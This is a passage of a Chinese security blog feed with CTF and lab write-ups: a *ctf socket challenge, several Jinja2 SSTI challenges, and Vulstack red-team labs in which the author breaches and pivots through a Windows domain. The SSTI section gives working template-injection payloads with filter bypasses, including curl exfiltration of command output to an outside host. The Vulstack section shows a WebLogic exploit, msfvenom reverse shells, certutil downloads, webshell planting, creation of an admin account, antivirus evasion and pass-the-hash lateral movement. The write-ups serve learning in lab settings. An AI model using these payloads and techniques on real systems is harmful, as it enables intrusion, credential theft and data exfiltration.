class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = <span class="built_in">open</span>(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>得到flag的条件是发送的数据为b’*ctf’</p><p>发现这个socket写的有些问题，连接大于2时就断开了，所以需要尝试自己写个socket连进去，防止别人在连，要一直循环。</p><p>于是得到如下client的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">&#x27;172.25.0.2&#x27;</span></span><br><span class="line">PORT=<span class="number">21587</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST,PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=<span class="string">b&#x27;*ctf&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">tcpCliSock.send(data)</span><br><span class="line">data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>但是有个问题，题目的服务器每两分钟重启一次，拿到shell后再装vim什么的太慢了，于是将脚本base64编码，</p><p>echo base64_encoded_script | base64 -d &gt;1.py</p><p>以这种方式将脚本内容上传至webserver，python3 1.py执行即可。</p><img src="http://cdn.polowong.top/static/images/xingctf.png"><p>我认为client.py 和client的容器是起迷惑作用 或者说是模拟别人在向server发送请求，所以在本地模拟时把client容器down掉就可以了。</p><p>为了验证这里一理论，我在题目的在线环境中通过webserver打到client服务器进行了LFI，发现并没有client.py，我认为上述说法成立。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当前还有个问题就是不知道是哪句话实现了删除文件前执行了文件里的内容。</p><p>参考链接：</p><p>雪宝wp</p><p><a href="https://blog.csdn.net/weixin_30526593/article/details/98650248">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl&lt;/p&gt;
&lt;h1 id=&quot;oh-my-socket&quot;&gt;&lt;a href=&quot;#oh-my-socket&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>近期ssti题目总结</title>
    <link href="https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/"/>
    <id>https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/</id>
    <published>2020-12-22T07:35:19.000Z</published>
    <updated>2021-01-06T13:34:04.259Z</updated>
    
    <content type="html"><![CDATA[<p>分析下近期做过的ssti题目的思路</p><h1 id="你的名字-题目分析"><a href="#你的名字-题目分析" class="headerlink" title="你的名字 题目分析"></a>你的名字 题目分析</h1><p>打开题目 发现输入名字</p><p>尝试输入4</p><p>报了一个php的错误</p><p>继续尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print 2*5 %&#125;</span><br></pre></td></tr></table></figure><p>成功.</p><p>下面将尝试利用ssti进行文件读取/命令执行</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print config%&#125;</span><br></pre></td></tr></table></figure><p>失败，返回值为空</p><p>尝试多个关键字后，发现是对黑名单关键词采取了置空的方法进行过滤，那么可以考虑在关键字中加入另一个关键字的方式，如 iconfigf 代表if。</p><p>首先获得所有子类</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.__claconfigss__.__mrconfigo__[<span class="number">2</span>].__subclconfigasses__()%&#125;</span><br></pre></td></tr></table></figure><p>拿到所有子类后，查找init global存在os模块的类，常见的是catch_warnings类</p><p>我这里用的是笨方法，将所有的子类打印出来后放到sublime里面找到的catch_warings类的下标为59</p><p>下面将进一步利用该类实现命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;ls &#x2F; |base64&#96;  &#39;)%&#125;</span><br><span class="line"></span><br><span class="line">通过curl外带命令执行的结果,获得了外带的根目录ls的结果，发现了flag的存放位置，直接getflag。</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125;</span><br></pre></td></tr></table></figure><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>介绍popen的用法</p><p>popen方法在os模块下，使用前需要import os</p><p>popen是从一个命令打开一个管道，返回值意味着执行结果，正常执行的话返回值为0</p><p>popen在ssti中常作为替代system进行命令执行的一种方式，现演示popen用法</p><img src="http://cdn.polowong.top/static/images/ssti4.png"><p>在此例中可以看到，调用os.popen.read()方法会返回执行系统命令的结果，而不是执行成功的返回值0</p><p>popen方法中subprocess模块下也有。</p><h1 id="安洵杯-normal-ssti"><a href="#安洵杯-normal-ssti" class="headerlink" title="安洵杯 normal_ssti"></a>安洵杯 normal_ssti</h1><p>首先看过滤了哪些关键字</p><img src="http://cdn.polowong.top/static/images/ssti1.png"><p>使用burp fuzz关键字，发现过滤了很多的关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先看过滤了&#123;&#123;,可以使用&#123;%print%&#125;</span><br></pre></td></tr></table></figure><p>的方式执行表达式</p><p>过滤了空格，可以用小括号的方式绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(1)%&#125;</span><br></pre></td></tr></table></figure><p>这里还过滤了.  可以用a t t r()绕过</p><p>其他的关键字可以考虑使用unicode编码绕过</p><p>lipsum方法globlas-builtins中存在os模块，可以直接执行命令。</p><p>首先构造未编码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure><p>然后构造编码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0077\u0068\u006f\u0061\u006d\u0069&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">接下来尝试读取flag：</span><br><span class="line"></span><br><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/ssti2.png"><h2 id="另一种思路"><a href="#另一种思路" class="headerlink" title="另一种思路"></a>另一种思路</h2><p>看了师傅们的解法，我在尝试另一种编码绕过的方式解决这个问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\137\137class\137\137%22)|attr(%22\137\137mro\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(1)|attr(%22\137\137subclasses\137\137%22)()|attr(%22\137\137\147etitem\137\137%22)(186)|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\137\137\147etitem\137\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br></pre></td></tr></table></figure><p>上述两种方法是通过找sys模块中的os进行命令执行。（膜一下师傅：）</p><h1 id="nctf-2020-ssti"><a href="#nctf-2020-ssti" class="headerlink" title="nctf 2020 ssti"></a>nctf 2020 ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>懒了，改一下上题的blacklist继续跑（doge</p><p>先用bp fuzz一下，发现过滤了很多关键字。</p><img src="http://cdn.polowong.top/static/images/ssti3.png"><p>根据上题思路，尝试unicode绕过对关键字的过滤，如</p><p>class -&gt;  \u0063\u006c\u0061\u0073\u0073</p><p>这种方法可以成功bypass。</p><p>官方wp的方法是用十六进制绕过，也是可以的，下面是用16进制绕过的pld：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\x5f\x5fcla%22+%22ss\x5f\x5f%22][%22\x5f\x5fmr%22+%22o\x5f\x5f%22][1][%22\x5f\x5fsubcla%22+%22sses\x5f\x5f%22]()[186][%22\x5f\x5fin%22+%22it\x5f\x5f%22][%22\x5f\x5fgloba%22+%22ls\x5f\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="unctf2020-ssti"><a href="#unctf2020-ssti" class="headerlink" title="unctf2020 ssti"></a>unctf2020 ssti</h1><p>blacklist:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ ] <span class="string">&#x27; &quot; _</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[] : __getitem__</span><br><span class="line"><span class="string">&#x27;和&quot;: request.args.xxx</span></span><br><span class="line"><span class="string">_: |attr()</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read</span><br></pre></td></tr></table></figure><h1 id="nctf-2020-你就是我的master吗"><a href="#nctf-2020-你就是我的master吗" class="headerlink" title="nctf 2020 你就是我的master吗"></a>nctf 2020 你就是我的master吗</h1><p>blacklist：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; . _ class base subclasses request</span></span><br></pre></td></tr></table></figure><p>绕过方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; :  &quot;&quot;</span></span><br><span class="line"><span class="string">. :[&quot;xxx&quot;] </span></span><br><span class="line"><span class="string">_:八进制 十六进制 Unicode 绕过 八进制如\137</span></span><br><span class="line"><span class="string">关键字： 字符串拼接 如 &quot;cla&quot;+&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:5000/?</span><br><span class="line">url=&#123;&#123;0[&quot;\137\137cla&quot;+&quot;ss\137\137&quot;][&quot;\137\137mro\137\137&quot;][1][&quot;\137\137subclas&quot;+&quot;ses\137\137&quot;]()[186][&quot;\137\137init\137\137&quot;][&quot;\137\137globals\137\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>flask/jinja2渲染殷勤的ssti问题考察更多的是对builtins函数/模块的使用以及了解程度，各种绕过过滤技巧 换而言之是对python语言基础语法的理解程度和面向对象思想的熟练程度。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;分析下近期做过的ssti题目的思路&lt;/p&gt;
&lt;h1 id=&quot;你的名字-题目分析&quot;&gt;&lt;a href=&quot;#你的名字-题目分析&quot; class=&quot;headerlink&quot; title=&quot;你的名字 题目分析&quot;&gt;&lt;/a&gt;你的名字 题目分析&lt;/h1&gt;&lt;p&gt;打开题目 发现输入名字&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VULSTACK 红队评估(二) </title>
    <link href="https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"/>
    <id>https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/</id>
    <published>2020-12-16T09:28:02.000Z</published>
    <updated>2020-12-16T09:30:37.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulstack红队评估（二）"><a href="#Vulstack红队评估（二）" class="headerlink" title="Vulstack红队评估（二）"></a>Vulstack红队评估（二）</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0/24</p><p>NAT网段为192.168.111.0/24</p><p>DC(内网)  网卡选择VMNET1，IPV4地址为  10.10.10.10    </p><p>WIN7(内网) 网卡选择VMNET1，IPV4地址为  10.10.10.20</p><p>WEBSERVER（内外网） 网卡1选择VMNET1，IPV4地址为10.10.10.80，网卡2选择NAT，DHCP auto configuration，本次地址为192.168.111.128</p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下存在三个批处理文件<code>setDomainEnv</code>，<code>startManagedWebLogic</code>，<code>stopManagedWebLogic</code>。点击配置weblogic环境。</p><p>启动服务后，访问web服务器ip:7001/console即可自动部署。</p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>进入weblogic页面后首先尝试弱口令weblogic/weblogic，登陆不进去，考虑使用weblogic扫描器。</p><img src="http://cdn.polowong.top/static/images/vs21.jpg"><p>通过扫描发现了CVE-2019-2725漏洞，尝试利用。</p><p>利用工具：</p><p><a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p><p>这个脚本有个问题，明明import了sys，requests等，但是运行的时候还是会报没有import，很奇怪，把它放到if name=main里面就好了（这里大概率是name==main带来的执行顺序的问题）</p><p>顺利运行脚本后，即可获得一个webshell，地址为：</p><p><a href="http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p><p>先用webshell查看systeminfo,发现为64位操作系统，尝试使用msfvenom生成64位的reverse shell</p><p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444  a- x64 -f exe &gt;/root/Desktop/shell.exe</p><p>kali启动apache服务，并将webshell放到/var/www/html目录下</p><p>利用Windows自带的工具 certutil下载webshell</p><p>certutil.exe -urlcache -split -f <a href="http://192.168.111.129/shell.exe">http://192.168.111.129/shell.exe</a></p><p>但是不行，直接被360干掉了。</p><p>使用java反序列化终极测试工具直接上传冰蝎shell，目录为</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\wlserver_10<span class="number">.3</span>\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/vs22.jpg"><p>可以直接连上~</p><p>下面将shell反弹到msf上，进行下一步的渗透。</p><h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>在meterpreter里面使用run get_local_subnets 获取服务器网卡信息</p><p>看到10网段，添加10网段路由：</p><p>run autoroute -s 10.10.10.0/24</p><p>然后启动socks代理</p><p>我这里对代理的理解是在msf启动socks5代理后，设置监听IP与端口，任何使用proxychains进行的动作都会转发到设置好的监听与端口上，与此同时msf设置了通往靶机内网的路由，便可将请求通过（命令）内网主机发送出去。</p><p>看一下net user /domain 发现了域内有五个用户</p><p>查询域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>通过ipconfig /all查询IP地址与DNS服务器地址（一般DNS服务器地址是DC）</p><p>使用net config workstation 查询工作站情况</p><img src="http://cdn.polowong.top/static/images/vs23.jpg"><p>可以确定，当前域为de1ay.com</p><p>接下来使用ladon探测内网主机存活情况</p><p>利用失败，无回显，在虚拟机查看发现被360拦截掉了。</p><p>由于java的meterpreter没有mimikatz模块，所以这里尝试上传Windows的shell并且加载mimikatz模块。（忘记了之前生成的shell被干掉了。。没办法，尝试免杀）</p><p>使用go免杀cs成功了，成功上线</p><img src="http://cdn.polowong.top/static/images/vs25.jpg"><p>接下来尝试添加管理员用户</p><p>net user polosec admin@123 /add</p><p>net localgroup Administrators polosec /add</p><p>由于360拦截 添加失败。</p><p>通过漏洞进行权限提升，拿到一个system权限的shell。</p><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><p>将cs会话派生给msf</p><p>首先CS新建一个foreign listener，选择https，记住设置的端口号和hsot。</p><p>msf一样的配置</p><p>注意这里一定要选reverse http 否则meterpreter会die</p><img src="http://cdn.polowong.top/static/images/vs26.jpg"><p>使用如下命令用ICMP协议探测主机存活：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用arp -a 查看arp缓存</p><img src="http://cdn.polowong.top/static/images/vs27.jpg"><p>确定主机大概为:</p><p>10.10.10.10(DC),</p><p>10.10.10.80,</p><p>10.10.10.201</p><p>目前10.10.10.80已经被拿下，下面尝试对10.10.10.10以及10.10.10.201主机进行渗透。</p><h2 id="渗透域内主机"><a href="#渗透域内主机" class="headerlink" title="渗透域内主机"></a>渗透域内主机</h2><p>通过PASS THE HASH 的方式传递NTLM hash实现上线DC和域内主机。</p><p>具体方法：</p><p>在CS中 view target -add 添加DC的IP，点击jump ，PS EXEC ，选择一个同域的账号密码进行PTH，即可顺利上线DC。</p><p>上线DC后再用mimikatz抓一下密码，然后利用同样的方法上线主机10.10.10.201。</p><img src="http://cdn.polowong.top/static/images/vs28.jpg"><p>顺利上线主机10.10.10.201：</p><img src="http://cdn.polowong.top/static/images/vs29.jpg"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次对vulstack靶场的学习，</p><p>进一步了解了CS MSF的用法，加深了对bypass uac 、提权的认识，学习了初步的免杀技巧；</p><p>学会了在msf中如何配置路由对内网进行扫描，学习了几个常用的提权方式 比如MS14058 MS15051；</p><p>使用pth的方式上线域内主机等等。。</p><p>目前存在的问题也非常多，包括不太了解CS，CS的shell掉线不知道是什么问题，以及还有很多很多现在还没有学习到的知识。</p><p>针对当前问题的学习目标：了解PTH，掌握mimikatz的用法，了解如何bypass uac，认识更多的提权方法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vulstack红队评估（二）&quot;&gt;&lt;a href=&quot;#Vulstack红队评估（二）&quot; class=&quot;headerlink&quot; title=&quot;Vulstack红队评估（二）&quot;&gt;&lt;/a&gt;Vulstack红队评估（二）&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>vulstack 红队评估(一) 内网渗透</title>
    <link href="https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2020-12-03T10:04:01.000Z</published>
    <updated>2020-12-03T10:07:03.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulstack-红队评估（一）"><a href="#vulstack-红队评估（一）" class="headerlink" title="vulstack 红队评估（一）"></a>vulstack 红队评估（一）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次做内网渗透的相关内容，做一个学习记录。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载镜像，虚拟机默认密码hongrisec@2019，登陆后有两台需要改密码，注意密码的格式。。别忘了再重装– 我的密码是<?php admin@123 隐藏下 ?></p><p>对网络的部署需要一定的计算机网络基础知识。</p><p>kali 网卡： NAT</p><p>web服务器（DMZ区）： 网卡1 NAT  网卡2 VMNET1（hostonly）</p><p>内网服务器1（域控）  网卡 VMNET1 hostonly</p><p>内网服务器2 ： 网卡 VMNET1 hostonly</p><p>部署好后由于Windows7开了防火墙，可以向外ping但是ping不动该机器，用两台内网主机ping一下试试能不能ping动。</p><img src="http://cdn.polowong.top/static/images/vs11.jpg"><p>正常情况下</p><p>主机可以ping通两台内网主机，win7可以ping通两台内网主机，kali可以ping通win7。</p><h2 id="web渗透工作"><a href="#web渗透工作" class="headerlink" title="web渗透工作"></a>web渗透工作</h2><p>开局phpstudy探针，猜一猜数据库账号密码root/root</p><p>phpmyadmin默认路径，日进去尝试写日志getshell。</p><p>首先看看是否开日志了</p><p> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/show.html&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>SHOW</strong></a> <strong>VARIABLES</strong> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html%23operator_like&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>LIKE</strong></a> ‘%general%’ </p><p>没开，开一下。</p><p>set golbal   